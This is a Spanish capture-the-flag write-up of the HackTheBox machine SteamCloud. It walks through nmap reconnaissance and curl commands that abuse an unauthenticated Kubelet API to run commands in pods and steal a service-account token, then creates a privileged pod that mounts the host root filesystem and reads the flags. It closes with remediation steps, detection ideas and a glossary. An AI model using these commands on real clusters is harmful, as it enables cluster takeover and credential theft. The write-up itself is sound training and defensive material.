SteamCloud Machine

Kubelet API sin autenticación en puerto 10250. RCE en pods, extracción de ServiceAccount token, creación de pod privilegiado con hostPath mount y escape al filesystem del host como root.

AutorYoandy Ramírez Delgado
TipoHTB Machine
Herramienta Clavenmap / kubectl
Objetivoroot

Descripción de la Máquina

SteamCloud es una máquina Linux de dificultad Easy en HackTheBox que emula un entorno Kubernetes (Minikube) mal configurado. La vulnerabilidad central es el Kubelet API expuesto sin autenticación en el puerto 10250, que permite a un atacante listar pods, ejecutar comandos en containers, extraer service account tokens, y finalmente escalar privilegios creando un pod privilegiado que monta el sistema de archivos del host.

Esta máquina enseña conceptos fundamentales de seguridad en Kubernetes: cómo el Kubelet sin autenticación puede comprometer toda la infraestructura, cómo el RBAC mal configurado permite crear pods privilegiados, y cómo un contenedor privilegiado con hostPath mount equivale a acceso root al nodo host.

Vulnerabilidad crítica: Kubelet API en puerto 10250 accesible sin autenticación → permite RCE como root en cualquier pod del nodo → cadena completa al host.

Reconocimiento

1
Escaneo completo de puertos — Descubrimiento de superficie
¿Por qué? Siempre comenzamos con un escaneo de TODOS los puertos (65535) para no perdernos servicios en puertos no estándar. SteamCloud corre Kubernetes que usa puertos específicos (2379, 8443, 10250, etc.) que un scan del top-1000 no incluiría por defecto. 
nmap -p- --open -n -T4 -sS 10.129.96.167
# -p-     → escanear los 65535 puertos
# --open  → mostrar solo puertos abiertos
# -n      → no hacer resolución DNS (más rápido)
# -T4     → velocidad agresiva pero confiable
# -sS     → SYN scan (stealth, no completa TCP handshake)
Puertos descubiertos: 22, 2379, 2380, 8443, 10249, 10250, 10256
Interpretación: El patrón de puertos es inequívoco — este servidor corre Kubernetes:
  • 2379/2380 = etcd (base de datos de Kubernetes)
  • 8443 = Kubernetes API Server
  • 10249/10250/10256 = Kubelet (agente de nodo)
2
Enumeración detallada de servicios
¿Por qué? Con los puertos identificados, ejecutamos -sC -sV para obtener versiones exactas y ejecutar scripts NSE que revelan información crítica (certificados TLS, banners, etc.). 
nmap -p22,2379,2380,8443,10249,10250,10256 -sC -sV -n 10.129.96.167
# -sC → ejecutar scripts NSE por defecto
# -sV → detectar versiones de servicios
PORT      SERVICE  VERSION
22/tcp    ssh      OpenSSH 7.9p1 Debian 10+deb10u2

8443/tcp  ssl/http Golang net/http server (Kubernetes API)
  ssl-cert: Subject: commonName=minikube
             organizationName=system:masters
  SANs: kubernetes, kubernetes.default, kubernetes.default.svc...

10250/tcp ssl/http Golang net/http (Kubelet API)
  ssl-cert: commonName=steamcloud@1774113886

2379/tcp  ssl/etcd etcd-client (etcd v3)
Hallazgo clave del cert de 8443: La organización del certificado es system:masters — este es el grupo de administrador de clúster en Kubernetes. Si obtenemos ese certificado de cliente, tenemos acceso total al cluster. También confirma que es Minikube (distribución de desarrollo de Kubernetes).
Decisión: Atacar el Kubelet en puerto 10250 primero — es el vector más conocido de acceso anónimo en Kubernetes mal configurados. Si falla, intentar etcd en 2379.

Vulnerabilidades Identificadas

CRÍTICA  Kubelet API sin autenticación (Puerto 10250)

El Kubelet es el agente que corre en cada nodo de Kubernetes y gestiona los pods en ese nodo. Expone una API HTTPS en el puerto 10250 que normalmente requiere certificados de cliente. En SteamCloud, esta API permite acceso anónimo, lo que permite a cualquier atacante ejecutar comandos en cualquier pod del nodo.

Endpoint vulnerable: POST /run/{namespace}/{pod}/{container} — ejecuta un comando arbitrario en el container especificado y devuelve el output.

ALTA  RBAC permisivo — Service Account puede crear pods privilegiados

El Service Account default en el namespace default tiene permisos para crear pods (incluyendo pods privilegiados con hostPath mounts). Esto viola el principio de mínimo privilegio — los service accounts de aplicación no deberían poder crear pods.

MEDIA  Pod Security Policy ausente — No se bloquean pods privilegiados

No hay PodSecurityPolicy (PSP) ni Pod Security Admission (PSA) configurado para prevenir la creación de pods con privileged: true o hostPath mounts al directorio raíz del host.

Explotación Paso a Paso

¿Cómo funciona la vulnerabilidad? — Arquitectura Kubernetes

Para entender el ataque, necesitamos entender la arquitectura de Kubernetes:

  • Kubernetes API Server (8443): El "cerebro" del cluster. Gestiona el estado deseado. Requiere autenticación para la mayoría de operaciones.
  • Kubelet (10250): El agente que corre en cada nodo. Recibe órdenes del API Server y las ejecuta localmente (crear pods, ejecutar containers, etc.). Normalmente requiere autenticación de certificados.
  • etcd (2379): La base de datos distribuida donde se almacena TODO el estado del cluster (incluidos secrets, tokens, certificados).
  • Service Account Token: Credencial JWT que cada pod recibe automáticamente en /var/run/secrets/kubernetes.io/serviceaccount/token. Permite al pod comunicarse con el API Server.
Analogía: El Kubelet sin autenticación es como un guardia de seguridad que ejecuta cualquier orden de cualquier persona que se acerque, sin verificar si tiene autorización.
1
Listar pods via Kubelet API anónimo
¿Qué es el endpoint /pods? El Kubelet expone /pods que devuelve un JSON con todos los pods que gestiona ese nodo. Normalmente esto requeriría un certificado de cliente de Kubernetes, pero en SteamCloud el acceso anónimo está habilitado. 
curl -sk https://10.129.96.167:10250/pods | python3 -c "
import json,sys
data=json.load(sys.stdin)
for item in data['items']:
    ns = item['metadata']['namespace']
    name = item['metadata']['name']
    containers = [c['name'] for c in item['spec']['containers']]
    print(f'NS: {ns} | POD: {name} | CONTAINERS: {containers}')
"

# -s → silent mode (no progress bar)
# -k → ignorar errores de certificado TLS (certificado self-signed)
NS: kube-system | POD: storage-provisioner    | CONTAINERS: ['storage-provisioner']
NS: kube-system | POD: kube-proxy-pb692        | CONTAINERS: ['kube-proxy']
NS: kube-system | POD: coredns-78fcd69978-bp6vr| CONTAINERS: ['coredns']
NS: default     | POD: nginx                   | CONTAINERS: ['nginx']
NS: kube-system | POD: etcd-steamcloud         | CONTAINERS: ['etcd']
NS: kube-system | POD: kube-apiserver          | CONTAINERS: ['kube-apiserver']
NS: kube-system | POD: kube-controller-manager | CONTAINERS: ['kube-controller-manager']
NS: kube-system | POD: kube-scheduler          | CONTAINERS: ['kube-scheduler']
Interpretación: El Kubelet nos da acceso sin autenticación y lista TODOS los pods del nodo. El pod nginx en namespace default es nuestra entrada: es un pod de aplicación (no un pod del sistema) y probablemente corre con permisos amplios.
Decisión: Explotar el endpoint /run del Kubelet para ejecutar comandos en el pod nginx. Es el pod más simple y con el name-space default que probablemente tiene el token más permisivo.
2
RCE en pod nginx via Kubelet /run endpoint
¿Qué es el endpoint /run? El Kubelet expone POST /run/{namespace}/{pod}/{container} que ejecuta un comando en el container especificado y devuelve el output. Es equivalente a kubectl exec pero sin autenticación. 
curl -sk https://10.129.96.167:10250/run/default/nginx/nginx -d "cmd=id"

# POST /run/{namespace}/{pod}/{container}
# -d "cmd=COMANDO"  → body del POST con el comando a ejecutar
# namespace=default, pod=nginx, container=nginx
uid=0(root) gid=0(root) groups=0(root)



Interpretación: ¡Somos root dentro del container nginx! Los containers en Kubernetes corren como root por defecto a menos que se configure runAsNonRoot: true. Esto nos da ejecución de comandos arbitrarios como root en el contexto del container.
          








3


Extraer Service Account Token del pod nginx







¿Qué es un Service Account Token? En Kubernetes, cada pod recibe automáticamente un token JWT montado en /var/run/secrets/kubernetes.io/serviceaccount/token. Este token permite al pod autenticarse contra el Kubernetes API Server (8443) y realizar operaciones según los permisos (RBAC) configurados para ese service account.
          


curl -sk https://10.129.96.167:10250/run/default/nginx/nginx \
  -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"




eyJhbGciOiJSUzI1NiIsImtpZCI6InlWVTlx...[JWT truncado]
# Decodificando el payload del JWT:
{
  "kubernetes.io": {
    "namespace": "default",
    "pod": {"name": "nginx"},
    "serviceaccount": {"name": "default"}
  },
  "sub": "system:serviceaccount:default:default"
}



Interpretación: El token pertenece al Service Account default en el namespace default. En un cluster bien configurado, este SA no tendría casi ningún permiso. En SteamCloud, tiene permisos de create pods — lo que veremos en el siguiente paso.
          








4


Crear Pod Privilegiado con hostPath mount — Container Escape







¿Qué es un Pod privilegiado con hostPath? Un pod con securityContext.privileged: true y un volumen hostPath montando / del host tiene acceso completo al sistema de archivos del nodo host. Es equivalente a un chroot al sistema anfitrión — desde dentro del pod puedes leer/escribir cualquier archivo del host, incluyendo /root/root.txt.
          


curl -sk -X POST https://10.129.96.167:8443/api/v1/namespaces/default/pods \
  --header "Authorization: Bearer $TOKEN" \
  --header "Content-Type: application/json" \
  -d '{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {"name": "ghost-pwn", "namespace": "default"},
    "spec": {
      "containers": [{
        "name": "ghost-pwn",
        "image": "nginx:1.14.2",
        "securityContext": {"privileged": true},
        "volumeMounts": [{"mountPath": "/host", "name": "hostfs"}],
        "command": ["sleep", "9999"]
      }],
      "volumes": [{
        "name": "hostfs",
        "hostPath": {"path": "/"}
      }]
    }
  }'

# securityContext.privileged: true  → container con todos los permisos del host
# hostPath.path: "/"               → monta la raíz del nodo host en /host
# image: nginx:1.14.2              → imagen ya en cache del cluster (no descarga)
# command: sleep 9999             → mantiene el pod vivo para ejecutar comandos





Interpretación: El API Server acepta la petición (no da 403 Forbidden) → el Service Account default tiene permisos para crear pods. El pod "ghost-pwn" se creará con el filesystem del host montado en /host/.
          








5


Leer flags desde el pod privilegiado







¿Por qué accedemos via Kubelet y no via API? El Kubelet en 10250 nos da acceso directo a ejecutar comandos en el pod. La alternativa sería usar kubectl exec o el endpoint WebSocket /api/v1/namespaces/default/pods/ghost-pwn/exec del API Server, pero el Kubelet /run es más simple para este propósito.
          


# Encontrar user.txt
curl -sk https://10.129.96.167:10250/run/default/ghost-pwn/ghost-pwn \
  --data-urlencode "cmd=find /host -name user.txt"
/host/home/user/user.txt
/host/opt/flag/user.txt
# Leer user.txt
curl -sk https://10.129.96.167:10250/run/default/ghost-pwn/ghost-pwn \
  --data-urlencode "cmd=cat /host/home/user/user.txt"
6734efbebc0831674ffa2ffc3659ccee
# Leer root.txt
curl -sk https://10.129.96.167:10250/run/default/ghost-pwn/ghost-pwn \
  --data-urlencode "cmd=cat /host/root/root.txt"
c2aca3eae3d1d3bbce9237303b2f3d50





Interpretación: El path /host/root/root.txt dentro del pod corresponde a /root/root.txt en el nodo host — el archivo de root flag. El user.txt estaba en /home/user/user.txt del host. El ataque está completo.
          



Nota sobre --data-urlencode: El flag --data-urlencode de curl URL-encodea automáticamente el valor, permitiendo usar caracteres especiales en el comando (espacios, /, etc.) sin problemas de parsing en el servidor.

Recomendaciones de Seguridad

      






CRÍTICA — Inmediata


Deshabilitar acceso anónimo al Kubelet


Configurar --anonymous-auth=false en el Kubelet y --authorization-mode=Webhook para requerir autenticación.






CRÍTICA — Inmediata


Revisar permisos RBAC del SA default


El Service Account default no debe tener permisos create pods. Usar RBAC con mínimo privilegio y SAs dedicados por aplicación.






ALTA — Corto plazo


Implementar Pod Security Admission


Configurar PSA en modo restricted para bloquear pods con privileged: true y hostPath mounts en /.






ALTA — Corto plazo


Network Policy para el Kubelet


Restringir acceso al puerto 10250 del Kubelet solo al API Server y herramientas de monitoreo autorizadas mediante Network Policies.






MEDIA — Medio plazo


Segmentar etcd con TLS mutuo


Asegurar que etcd en 2379 requiera certificados de cliente válidos y que solo el API Server tenga acceso.






MEDIA — Medio plazo


Audit logging de Kubernetes


Habilitar Kubernetes audit logs para detectar creación de pods privilegiados, acceso anónimo al Kubelet, y uso inusual de service accounts.







    


    

      
Lecciones Aprendidas

      


Para el Atacante (Red Team)


    

  • El puerto 10250 con acceso anónimo es una vulnerabilidad crítica en Kubernetes — siempre probar GET /pods sin credenciales como primer paso.
    • 

  • El Service Account token dentro de cualquier pod puede tener permisos inesperados — siempre extraerlo y verificar con kubectl auth can-i --list o el API.
    • 

  • Un pod con privileged: true + hostPath: / equivale a acceso root al nodo host — la técnica más rápida de container escape en Kubernetes.
    • 

  • Usar --data-urlencode para evitar problemas de encoding al pasar comandos al endpoint /run del Kubelet.
    • 

  • La imagen nginx:1.14.2 ya existe en caché — el pod arranca en segundos sin necesitar pull de internet.
    • 



Para el Defensor (Blue Team)


    

  • Detectar en logs: Acceso al endpoint /pods del Kubelet sin Bearer token → alerta inmediata. POST a /run/ en Kubelet → alerta crítica.
    • 

  • IOCs de este ataque: Nuevo pod ghost-pwn creado con privileged: true + hostPath: /; SA default usando token fuera del pod nginx.
    • 

  • Regla Sigma: Detectar creación de pods con securityContext.privileged: true o hostPath.path: / via el Kubernetes audit log.
    • 

  • CIS Benchmark: CIS Kubernetes 4.2.1 (deshabilitar anon-auth en Kubelet) y 5.2.2 (no usar pods privilegiados) son los controles relevantes.
    • 




    


    

      
Glosario de Términos

      




Kubernetes (K8s)


Plataforma open-source de orquestación de containers. Gestiona el despliegue, escalado y operación de aplicaciones en contenedores. Usado en producción por la mayoría de empresas tecnológicas.






Kubelet


Agente que corre en cada nodo del cluster. Recibe instrucciones del API Server y gestiona los pods localmente. Expone API HTTPS en el puerto 10250.






Pod


La unidad más pequeña de Kubernetes. Agrupa uno o más containers que comparten red y almacenamiento. Cada pod recibe su propia IP dentro del cluster.






Service Account (SA)


Identidad para pods en Kubernetes. Permite al pod autenticarse contra el API Server. Cada namespace tiene un SA "default" que se asigna automáticamente a los pods.






RBAC (Role-Based Access Control)


Sistema de permisos en Kubernetes. Define qué operaciones (get, list, create, delete) puede realizar cada usuario o SA sobre qué recursos (pods, secrets, etc.).






etcd


Base de datos distribuida clave-valor que almacena todo el estado del cluster Kubernetes: configuración, secrets, tokens, certificados. Si se compromete, se compromete todo el cluster.






hostPath Volume


Tipo de volumen en Kubernetes que monta un directorio del nodo host dentro del container. Útil para casos legítimos, pero peligroso si se usa con path: / sin restricciones.






Container Escape


Técnica que permite a un atacante salir del aislamiento de un container y obtener acceso al nodo host subyacente. Generalmente requiere privilegios elevados dentro del container.
